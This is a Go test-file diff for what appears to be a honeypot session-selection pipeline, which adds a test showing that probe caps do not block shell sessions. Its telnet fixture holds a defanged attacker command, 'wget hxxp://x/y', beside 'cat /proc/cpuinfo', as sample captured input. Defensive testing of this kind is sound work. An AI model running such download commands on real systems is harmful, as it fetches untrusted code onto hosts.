@@ -68,7 +68,7 @@ func TestFamilyCapStopsVariantsOfOneCampaign(t *testing.T) {
 		p.decide(c)
 		decisions = append(decisions, c.Decision)
 		if c.Decision == "upload" {
-			p.State.RecordUpload(res.Fingerprint, res.Family, fmt.Sprint("cap", i), p.Now(), false)
+			p.State.RecordUpload(res.Fingerprint, res.Family, fmt.Sprint("cap", i), p.Now(), false, false)
 		}
 	}
 	if len(fams) != 1 {
@@ -93,7 +93,7 @@ func TestRatioGuardRaisesThreshold(t *testing.T) {
 		p.State.Observe(fmt.Sprint("fp", i), classify.ScanOnly, fmt.Sprint("10.0.0.", i), p.Now())
 	}
 	for i := 0; i < 3; i++ {
-		p.State.RecordUpload(fmt.Sprint("fp", i), fmt.Sprint("fam", i), "x", p.Now(), false)
+		p.State.RecordUpload(fmt.Sprint("fp", i), fmt.Sprint("fam", i), "x", p.Now(), false, false)
 	}
 	seen, up := p.State.Ratio(p.Now(), 7)
 	if seen != 10 || up != 3 {
@@ -152,4 +152,54 @@ func TestNoNoveltyBonusForSprays(t *testing.T) {
 	if !noveltyApplies(classify.ServiceProbe) || !noveltyApplies(classify.WebExploit) || !noveltyApplies(classify.CommandsRun) {
 		t.Error("novelty bonus must apply to probes, exploits and shells")
 	}
+}
+
+// Probes share probe_cap slots; a shell session is never blocked by them.
+func TestTierCapLeavesRoomForShells(t *testing.T) {
+	p := newTestPipeline(t)
+	p.Cfg.Select.ProbeCap = 2
+	p.Cfg.Select.DailyCap = 20
+	at := p.Now()
+	for i := 0; i < 3; i++ {
+		// distinct HTTP probes: different path sets, readable payloads, score >= 40
+		s := httpProbe(fmt.Sprintf("198.51.100.%d", 10+i), at, fmt.Sprintf("GET /probe-%c", 'a'+i))
+		c := &Candidate{Session: s, Result: classify.Run(s, nil)}
+		if c.Result.Class != classify.ServiceProbe {
+			t.Fatalf("probe %d class %s", i, c.Result.Class)
+		}
+		p.decide(c)
+		want := "upload"
+		if i == 2 {
+			want = "tier-cap"
+		}
+		if c.Decision != want {
+			t.Fatalf("probe %d decision %s, want %s (score %d)", i, c.Decision, want, c.Result.Score)
+		}
+		if c.Decision == "upload" {
+			p.State.RecordUpload(c.Result.Fingerprint, c.Result.Family, "x", at, false, lowTier(c.Result))
+		}
+	}
+	s, evs := telnetSession("198.51.100.50", at, "cat /proc/cpuinfo", "wget hxxp://x/y")
+	c := &Candidate{Session: s, Result: classify.Run(s, evs)}
+	p.decide(c)
+	if c.Decision != "upload" || lowTier(c.Result) {
+		t.Fatalf("shell session: decision %s class %s", c.Decision, c.Result.Class)
+	}
+}
+
+func httpProbe(ip string, at time.Time, reqs ...string) *session.Session {
+	s := &session.Session{Remote: net.ParseIP(ip), LinkType: layers.LinkTypeEthernet, Start: at, End: at.Add(time.Second), LocalPorts: []int{8080}}
+	for i, r := range reqs {
+		payload := []byte(r + " HTTP/1.1\r\nHost: x\r\n\r\n")
+		for j := 0; j < 10; j++ { // enough packets to count as a probe
+			pl := payload
+			if j > 0 {
+				pl = nil
+			}
+			s.Packets = append(s.Packets, session.Packet{CI: gopacket.CaptureInfo{Timestamp: at.Add(time.Duration(j) * 10 * time.Millisecond), CaptureLength: len(pl) + 54, Length: len(pl) + 54}, Data: append(make([]byte, 54), pl...), Payload: pl, Remote: s.Remote, Proto: layers.IPProtocolTCP, RemPort: 40000 + i, LocPort: 8080, ToLocal: j%2 == 0})
+		}
+		s.Flows = append(s.Flows, session.Flow{Proto: layers.IPProtocolTCP, RemPort: 40000 + i, LocPort: 8080, Pkts: 10})
+	}
+	s.TotalPkts = len(s.Packets)
+	return s
 }
